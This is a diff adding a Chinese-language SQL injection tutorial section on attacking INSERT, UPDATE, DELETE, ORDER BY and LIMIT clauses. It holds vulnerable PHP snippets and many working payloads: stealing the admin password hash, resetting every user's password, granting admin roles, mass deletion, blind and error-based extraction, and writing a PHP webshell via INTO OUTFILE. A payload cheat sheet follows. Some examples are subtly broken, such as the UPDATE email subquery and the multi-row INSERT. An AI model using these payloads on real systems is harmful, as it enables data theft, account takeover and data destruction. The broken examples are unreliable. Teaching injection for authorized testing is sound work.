@@ -12,9 +12,16 @@
 8. [绕过技术](#绕过技术)
 9. [二次注入](#二次注入)
 10. [不同数据库的注入差异](#不同数据库的注入差异)
-11. [SQL 注入防御](#sql-注入防御)
-12. [实战练习资源](#实战练习资源)
-13. [DNSLog 带外注入](#0x11-dnslog-带外注入out-of-band)
+11. [INSERT/UPDATE/DELETE 注入（非查询语句注入）](#insertupdatedelete-注入非查询语句注入)
+    - 11.1 [INSERT 注入](#0x18-insert-注入)
+    - 11.2 [UPDATE 注入](#0x19-update-注入)
+    - 11.3 [DELETE 注入](#0x20-delete-注入)
+    - 11.4 [ORDER BY / GROUP BY 注入](#0x21-order-by--group-by-注入)
+    - 11.5 [LIMIT 注入](#0x22-limit-注入)
+    - 11.6 [非查询注入总结](#0x23-非查询注入总结)
+12. [SQL 注入防御](#sql-注入防御)
+13. [实战练习资源](#实战练习资源)
+14. [DNSLog 带外注入](#0x11-dnslog-带外注入out-of-band)
 
 ---
 
@@ -895,9 +902,542 @@ id=1 AND (CASE WHEN 1=1 THEN PG_SLEEP(3) ELSE 0 END)
 
 ---
 
+## INSERT/UPDATE/DELETE 注入（非查询语句注入）
+
+### 0x17 概述
+
+前面的注入技术大多围绕 `SELECT` 查询语句展开，但在实际场景中，`INSERT`、`UPDATE`、`DELETE` 等写操作语句同样存在注入风险，且危害往往更大 —— 它们可以直接修改、删除数据库中的数据。
+
+| 语句 | 常见场景 | 危害 |
+|------|----------|------|
+| **INSERT** | 用户注册、添加文章、提交评论 | 插入恶意数据、越权创建管理员账户 |
+| **UPDATE** | 修改密码、更新个人资料、修改文章 | 修改他人密码、篡改数据、权限提升 |
+| **DELETE** | 删除评论、删除文章、注销账户 | 批量删除数据、破坏数据库完整性 |
+
+非查询注入与 SELECT 注入的最大区别在于：**攻击者通常无法直接看到查询结果**，因此报错注入和盲注技术在这里尤为重要。
+
+---
+
+### 0x18 INSERT 注入
+
+INSERT 注入发生在将用户输入拼接到 `INSERT` 语句中时。
+
+#### 场景一：用户注册
+
+假设注册功能的代码如下：
+
+```php
+$username = $_POST['username'];
+$password = md5($_POST['password']);
+$sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
+mysqli_query($conn, $sql);
+```
+
+##### 1. 子查询注入（窃取其他数据）
+
+如果攻击者知道表结构，可以通过子查询将其他数据插入到自己可见的字段中：
+
+```sql
+-- 攻击者在用户名处输入：
+attacker', (SELECT password FROM users WHERE username='admin')) -- 
+
+-- 实际执行的 SQL：
+INSERT INTO users (username, password) VALUES ('attacker', (SELECT password FROM users WHERE username='admin')) -- ', 'md5hash')
+```
+
+这样，admin 的密码（或其 hash）就被插入到了 attacker 用户的某个字段中，攻击者注册后登录即可看到。
+
+##### 2. 报错注入（INSERT 上下文）
+
+INSERT 语句中同样可以使用报错注入函数来获取数据：
+
+```sql
+-- payload 模板
+attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (注入查询))) AND '1'='1
+
+-- 获取当前数据库名
+attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1
+
+-- 实际执行：
+INSERT INTO users (username, password) VALUES ('attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1', 'md5hash')
+-- 错误信息：XPATH syntax error: '~database_name'
+```
+
+> **技巧**：`AND '1'='1` 最后的闭合与开头的 `'` 配对，确保整个 SQL 语法正确。
+
+##### 3. 使用 `UPDATE` 语法（MySQL `ON DUPLICATE KEY`）
+
+MySQL 的 `INSERT ... ON DUPLICATE KEY UPDATE` 提供了额外的注入可能：
+
+```sql
+-- 攻击者在用户名处输入：
+admin' ON DUPLICATE KEY UPDATE password='hacked' -- 
+
+-- 实际执行的 SQL：
+INSERT INTO users (username, password) VALUES ('admin' ON DUPLICATE KEY UPDATE password='hacked' -- ', 'md5hash')
+```
+
+如果 `admin` 用户已存在（唯一键冲突），这将把其密码更新为 `hacked`。
+
+##### 4. 多行插入利用
+
+如果程序支持批量插入，可以注入额外的行来创建后门账户：
+
+```sql
+-- 攻击者输入：
+normal'), ('attacker2', 'attacker2_hash
+
+-- 实际执行：
+INSERT INTO users (username, password) VALUES ('normal'), ('attacker2', 'attacker2_hash', 'md5hash')
+```
+
+##### 5. INSERT 盲注
+
+当 INSERT 没有直接报错输出时，可以使用时间盲注：
+
+```sql
+-- 判断数据库名长度
+attacker' OR IF(LENGTH(DATABASE()) = 8, SLEEP(3), 0) OR '
+
+-- 逐字符猜解数据库名
+attacker' OR IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 0) OR '
+```
+
+也可以利用布尔盲注，通过是否注册成功（如"用户名已存在"则注册失败）来判断条件真伪：
+
+```sql
+-- 测试 admin 密码长度是否大于 32
+attacker' OR (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password) > 32) OR '
+-- 注册成功 = 条件为 False → 长度 ≤ 32
+-- 注册失败 = 条件为 True  → 长度 > 32（因为 admin 用户的子查询返回了结果，导致 OR 条件为真）
+```
+
+##### 6. INSERT 信息获取完整示例
+
+假设一个留言板功能，插入语句为：
+
+```sql
+INSERT INTO comments (username, content) VALUES ('$user', '$content')
+```
+
+**Step 1：获取数据库名**
+
+```
+content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1
+→ 报错显示: XPATH syntax error: '~security'
+```
+
+**Step 2：获取表名**
+
+```
+content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'))) AND '1'='1
+→ 报错显示: XPATH syntax error: '~users,posts,comments'
+```
+
+**Step 3：获取列名**
+
+```
+content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'))) AND '1'='1
+→ 报错显示: XPATH syntax error: '~id,username,password,email'
+```
+
+**Step 4：获取数据**
+
+```
+content = test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(username, ':', password) FROM security.users LIMIT 0,1))) AND '1'='1
+→ 报错显示: XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb882cf99'
+```
+
+---
+
+### 0x19 UPDATE 注入
+
+UPDATE 注入的危险性最高，因为它可以直接修改数据库中的现有数据。
+
+#### 典型漏洞场景
+
+```php
+// 修改密码的功能
+$username = $_SESSION['username'];
+$new_password = md5($_POST['new_password']);
+$sql = "UPDATE users SET password = '$new_password' WHERE username = '$username'";
+mysqli_query($conn, $sql);
+
+// 管理员修改用户信息
+$user_id = $_POST['user_id'];
+$email = $_POST['email'];
+$sql = "UPDATE users SET email = '$email' WHERE id = $user_id";
+```
+
+##### 1. 通过 SET 子句窃取数据
+
+攻击者可以将自己的某个字段值修改为其他用户的敏感数据（前提是子查询只返回一行一列）：
+
+```sql
+-- 场景：修改自己的邮箱
+-- 在 email 输入框中注入：
+(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
+
+-- 实际执行：
+UPDATE users SET email = '(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- ' WHERE id=456
+```
+
+这样，用户 ID 1234 的 email 字段就被修改为 admin 的密码。如果 email 字段在个人资料页可见，攻击者就获取了 admin 的密码 hash。
+
+> ⚠️ **注意**：MySQL 的 UPDATE SET 子查询默认不能引用正在更新的同一张表。需要绕过时可考虑使用派生表。
+
+##### 2. 修改其他用户的数据（核心威胁）
+
+通过闭合 WHERE 条件来修改任意用户的数据：
+
+```sql
+-- 场景：修改自己的密码
+-- 在 new_password 输入框中注入：
+hacked123' WHERE username='admin' -- 
+
+-- 实际执行：
+UPDATE users SET password = 'hacked123' WHERE username='admin' -- ' WHERE id=123
+```
+
+这把 **admin 用户的密码**改成了 `hacked123`！
+
+更危险的例子 —— 批量修改所有用户：
+
+```sql
+-- 输入：
+hacked' WHERE 1=1 -- 
+
+-- 实际执行：
+UPDATE users SET password = 'hacked' WHERE 1=1 -- ' WHERE id=123
+```
+
+这会修改**所有用户**的密码。
+
+##### 3. 多字段注入
+
+如果 `SET` 后面有多列可控，攻击面更大：
+
+```sql
+-- 原始 SQL：
+UPDATE users SET email = '$email', signature = '$signature' WHERE id = $id
+```
+
+攻击者在 `email` 处注入，劫持后面的字段：
+
+```sql
+-- 在 email 处输入：
+test@test.com', signature = (SELECT password FROM users WHERE username='admin'), role = 'admin' WHERE id = (SELECT id FROM users WHERE username='attacker') -- 
+
+-- 实际执行效果：将 attacker 用户的 role 改为 admin
+UPDATE users SET email = 'test@test.com', signature = (SELECT password FROM users WHERE username='admin'), role = 'admin' WHERE id = (SELECT id FROM users WHERE username='attacker') -- ', signature = 'xxx' WHERE id=123
+```
+
+##### 4. UPDATE 报错注入
+
+```sql
+-- 在可注入的字段中输入：
+test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1
+
+-- 实际执行：
+UPDATE users SET password = 'test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND '1'='1' WHERE id=123
+-- 错误信息：XPATH syntax error: '~database_name'
+```
+
+如果 password 是数字型字段（如 `age=25`），闭合方式稍有不同：
+
+```sql
+-- 数字型 UPDATE：
+25 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))
+
+-- 实际执行：
+UPDATE users SET age = 25 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) WHERE id=123
+```
+
+##### 5. UPDATE 盲注
+
+```sql
+-- 时间盲注：判断 admin 密码的第一位字符
+test' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97, SLEEP(3), 0) OR '
+
+-- 布尔盲注：利用修改是否"成功/失败"的返回信息来判断
+test' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 32 AND '1'='1
+-- 如果修改成功，说明 admin 密码长度为 32
+-- 如果修改失败，说明长度不是 32
+```
+
+---
+
+### 0x20 DELETE 注入
+
+DELETE 注入较为少见（因为删除操作通常不需要用户输入复杂数据），但一旦存在，危害等级极高。
+
+#### 典型漏洞场景
+
+```php
+// 删除文章
+$post_id = $_GET['id'];
+$user_id = $_SESSION['user_id'];
+$sql = "DELETE FROM posts WHERE id = $post_id AND user_id = $user_id";
+mysqli_query($conn, $sql);
+```
+
+这是数字型注入的典型场景。核心目标是**注释掉后面的 `AND user_id = xxx` 限制条件**：
+
+```sql
+-- URL: delete.php?id=1 OR 1=1 -- 
+
+-- 实际执行：
+DELETE FROM posts WHERE id = 1 OR 1=1 -- AND user_id = 123
+```
+
+这会删除 posts 表中的**所有**记录！（`OR 1=1` 让 WHERE 条件始终为真）
+
+> ⚠️ **极度危险**：DELETE 注入可能造成不可逆的数据丢失。在真实渗透测试中必须极度谨慎，建议先通过盲注确认注入点存在，而非直接执行破坏性 payload。
+
+##### DELETE 报错注入
+
+```sql
+-- URL: delete.php?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))
+
+-- 实际执行：
+DELETE FROM posts WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))) AND user_id = 123
+-- 错误信息：XPATH syntax error: '~database_name'
+```
+
+##### DELETE 盲注
+
+```sql
+-- 时间盲注
+id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 0)
+
+-- 布尔盲注：通过观察删除操作的返回信息（成功/失败）来判断
+id=1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 32
+```
+
+> ⚠️ **警告**：DELETE 注入的布尔盲注每次判断**都会实际删除一条数据**（当条件为真时删除，为假时不删），在真实环境中必须极其小心。建议优先使用时间盲注，因为 SLEEP 可以在 DELETE 执行前触发，且条件为真时不影响删除的 WHERE 逻辑。
+
+##### 更安全的 DELETE 盲注技巧
+
+利用 `AND` 的短路特性，将 SLEEP 放在前面：
+
+```sql
+-- 条件为真时：先 SLEEP 3 秒，再执行删除（不影响删除逻辑）
+id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 1)
+
+-- 条件为假时：IF 返回 1（不影响删除），不延时
+id=1 AND IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 999, SLEEP(3), 1)
+```
+
+---
+
+### 0x21 ORDER BY / GROUP BY 注入
+
+当 `ORDER BY` 或 `GROUP BY` 后面的列名/排序方式由用户输入控制时，存在注入风险。这种注入在排序功能、报表功能中尤为常见。
+
+```php
+// 典型的注入场景
+$order = $_GET['order'];    // 用户可控的排序列
+$dir = $_GET['dir'];        // 用户可控的排序方向
+$sql = "SELECT * FROM products ORDER BY $order $dir";
+mysqli_query($conn, $sql);
+```
+
+#### 判断是否存在 ORDER BY 注入
+
+```sql
+-- 正常请求（按 id 排序）：
+?order=id&dir=ASC
+
+-- 测试1：注入单引号
+?order=id'
+
+-- 测试2：使用子查询（如果报错或排序行为异常，说明存在注入）
+?order=(SELECT 1)
+
+-- 测试3：使用 SLEEP 测试（时间差异说明存在注入）
+?order=(SELECT SLEEP(3))
+```
+
+#### 利用方式
+
+##### 1. 布尔盲注（通过排序差异推断）
+
+核心思路：根据条件真伪返回不同的排序结果，通过观察页面中记录的顺序来推断数据。
+
+```sql
+-- 判断数据库名第一个字符是否为 's'
+-- 如果为真，按 id 排序；如果为假，按 username 排序
+?order=IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, id, username)
+```
+
+更隐蔽的方式（使用子查询干扰排序）：
+
+```sql
+-- 根据条件，让某条记录排到第一或最后
+?order=(SELECT IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, 1, (SELECT 1 UNION SELECT 2)))
+```
+
+##### 2. 时间盲注
+
+```sql
+?order=IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, SLEEP(3), 1)
+```
+
+##### 3. 报错注入
+
+当 ORDER BY 后面直接拼接了用户输入，且允许执行子查询时：
+
+```sql
+-- 使用 extractvalue
+?order=EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))
+
+-- 使用 updatexml
+?order=UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE())), 1)
+
+-- 使用经典 floor + rand + group by
+?order=(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND()*2)) AS x FROM information_schema.TABLES GROUP BY x) AS y)
+```
+
+注意：`ORDER BY` 后面的子查询必须用括号包裹。
+
+##### 4. 利用 PROCEDURE ANALYSE()（MySQL 特有）
+
+MySQL 的 `PROCEDURE ANALYSE()` 可以在 SELECT 末尾调用，某些情况下可以与 ORDER BY 结合：
+
+```sql
+-- MySQL 5.x 中，PROCEDURE ANALYSE 可在 ORDER BY 之后使用
+?order=id LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))), 1)
+```
+
+##### 5. GROUP BY 注入
+
+与 ORDER BY 类似，GROUP BY 后的用户输入同样可被利用：
+
+```sql
+-- 原始 SQL
+SELECT category, COUNT(*) FROM products GROUP BY $user_input
+
+-- 报错注入 payload
+?group=category, EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))
+
+-- 布尔盲注
+?group=IF(ASCII(SUBSTRING(DATABASE(), 1, 1)) = 115, category, product_name)
+```
+
+---
+
+### 0x22 LIMIT 注入
+
+当 `LIMIT` 后面的参数可控时，存在注入风险。MySQL 5.x 中 `LIMIT` 后面可以跟 `PROCEDURE ANALYSE()` 和 `INTO OUTFILE`。
+
+```php
+// 典型的分页场景
+$limit = $_GET['limit'];
+$offset = $_GET['offset'];
+$sql = "SELECT * FROM articles LIMIT $offset, $limit";
+```
+
+#### 利用方式
+
+##### 1. PROCEDURE ANALYSE() 报错注入（MySQL 5.x）
+
+```sql
+-- 判断是否存在 LIMIT 注入
+?limit=1 PROCEDURE ANALYSE(1,1)
+
+-- 获取数据库名
+?limit=1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()))), 1)
+
+-- 获取表名
+?limit=1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()))), 1)
+
+-- 获取列名
+?limit=1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'))), 1)
+```
+
+> ⚠️ **版本限制**：`PROCEDURE ANALYSE()` 在 MySQL 5.7.18 之后已被废弃，MySQL 8.0 中完全移除。
+
+##### 2. UNION + LIMIT 联合注入
+
+如果程序将 LIMIT 的值完整拼接到 SQL：
+
+```sql
+?limit=10 UNION SELECT 1,2,3,DATABASE(),5 -- 
+```
+
+##### 3. INTO OUTFILE 写文件（写 Webshell）
+
+```sql
+?limit=10 INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[1]);?>'
+```
+
+---
+
+### 0x23 非查询注入总结
+
+#### 各类注入难度与利用方式对比
+
+| 注入类型 | 最佳利用方式 | 关键技巧 | 难度 |
+|----------|--------------|----------|------|
+| INSERT | 报错注入 / 子查询窃取 | 闭合 VALUES 子句，利用子查询或报错函数获取数据 | ⭐⭐⭐ |
+| UPDATE | 报错注入 / 修改条件 | 闭合 SET 和 WHERE 子句，利用子查询将数据写入可见字段 | ⭐⭐⭐ |
+| DELETE | 时间盲注 / 报错注入 | 注释或修改 WHERE 条件，注意避免误删数据 | ⭐⭐ |
+| ORDER BY | 布尔盲注 / 时间盲注 | 使用 IF/CASE WHEN 控制排序顺序来判断条件 | ⭐⭐⭐ |
+| GROUP BY | 报错注入 | 在 GROUP BY 列名后拼接报错函数 | ⭐⭐⭐ |
+| LIMIT | PROCEDURE ANALYSE() | 拼接 PROCEDURE ANALYSE 实现报错注入 | ⭐⭐ |
+
+#### 核心思路总结
+
+1. **闭合原有语句**：用 `'`、`"`、`')` 等闭合原始 SQL 的上下文
+2. **构造合法语法**：确保注入后的 SQL 语句语法完整、正确
+3. **利用报错或盲注**：在无法直接看到结果时，用报错注入或盲注获取数据
+4. **注意副作用**：INSERT/UPDATE/DELETE 注入会产生实际的数据库修改，测试时务必在授权靶场进行
+
+#### 各语句注入的 payload 速记
+
+```sql
+-- ===== INSERT 注入 =====
+-- 报错注入模板
+attacker' AND EXTRACTVALUE(1, CONCAT(0x7e, (查询))) AND '1'='1
+-- 子查询窃取数据
+attacker', (SELECT password FROM users WHERE username='admin')) -- 
+-- 多行插入
+normal'), ('backdoor', 'backdoor_hash
+
+-- ===== UPDATE 注入 =====
+-- 修改他人密码
+hacked' WHERE username='admin' -- 
+-- 窃取数据到可见字段
+(SELECT password FROM users WHERE username='admin') WHERE id=1234 -- 
+-- 报错注入
+test' AND EXTRACTVALUE(1, CONCAT(0x7e, (查询))) AND '1'='1
+
+-- ===== DELETE 注入 =====
+-- 批量删除（危险！）
+1 OR 1=1 -- 
+-- 报错注入
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, (查询)))
+-- 时间盲注
+1 AND IF(条件, SLEEP(3), 1)
+
+-- ===== ORDER BY 注入 =====
+-- 布尔盲注（通过排序差异）
+IF(条件, id, username)
+-- 时间盲注
+IF(条件, SLEEP(3), 1)
+-- 报错注入（子查询形式）
+(SELECT 1 FROM (SELECT COUNT(*), CONCAT((查询), FLOOR(RAND()*2)) AS x FROM information_schema.TABLES GROUP BY x) AS y)
+
+-- ===== LIMIT 注入 =====
+-- 报错注入（MySQL 5.x）
+1 PROCEDURE ANALYSE(EXTRACTVALUE(1, CONCAT(0x7e, (查询))), 1)
+```
+
+---
+
 ## SQL 注入防御
 
-### 0x17 核心防御原则
+### 0x24 核心防御原则
 
 防御 SQL 注入的核心思想其实很简单：**永远不要信任用户的输入，永远将数据与代码分离。**
 
